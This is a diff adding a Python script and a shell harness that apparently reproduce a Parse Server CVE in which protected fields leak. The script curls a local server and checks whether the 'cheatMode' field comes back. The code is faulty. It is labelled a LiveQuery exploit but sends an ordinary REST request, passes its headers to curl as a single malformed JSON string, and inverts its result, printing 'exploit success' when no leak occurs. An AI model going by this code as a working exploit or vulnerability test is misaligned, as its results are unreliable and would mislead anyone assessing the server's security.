
diff --git a/ACI_unit_test.py b/ACI_unit_test.py
new file mode 100644
index 00000000..fa4d7092
--- /dev/null
+++ b/ACI_unit_test.py
@@ -0,0 +1,34 @@
+import subprocess
+import json
+
+# Simulate the interaction with the Parse Server LiveQuery
+def exploit_live_query():
+    try:
+        # Assuming the server is running locally on port 1337
+        url = "http://localhost:1337/classes/MyClass"
+        headers = {'X-Parse-Application-Id': 'myAppId', 'Content-Type': 'application/json'}
+        data = json.dumps({
+            "where": {
+                "playerName": "John Doe"
+            },
+            "className": "GameScore",
+            "fields": ["score", "playerName", "cheatMode"]  # 'cheatMode' should be a protected field
+        })
+        response = subprocess.run(['curl', '-X', 'GET', '-H', json.dumps(headers), '-d', data, url], capture_output=True, text=True)
+        response_data = json.loads(response.stdout)
+        
+        # Check if protected field 'cheatMode' is present in the response
+        if 'cheatMode' in response_data['results'][0]:
+            return False
+        else:
+            return True
+    except Exception as e:
+        print(f"Error during exploit: {str(e)}")
+        return False
+
+# Run the exploit test
+if exploit_live_query():
+    print("The ACI exploit success!!!")
+else:
+    print("The ACI exploit failed!!!")
+
diff --git a/ACI_unit_test.sh b/ACI_unit_test.sh
new file mode 100644
index 00000000..4b6c1c06
--- /dev/null
+++ b/ACI_unit_test.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+# Setup and run the environment for CVE testing
+
+# Echo commands to ensure visibility of operations
+set -x
+
+# Install necessary dependencies (assuming Node.js and npm are already installed)
+npm install
+
+# Start the Parse Server (assuming configuration is already set up)
+npm start &
+
+# Wait for the server to fully start
+sleep 10
+
+# Run the Python script to test the CVE exploit
+python ACI_unit_test.py
+
+# Kill the Parse Server process
+kill $!
+
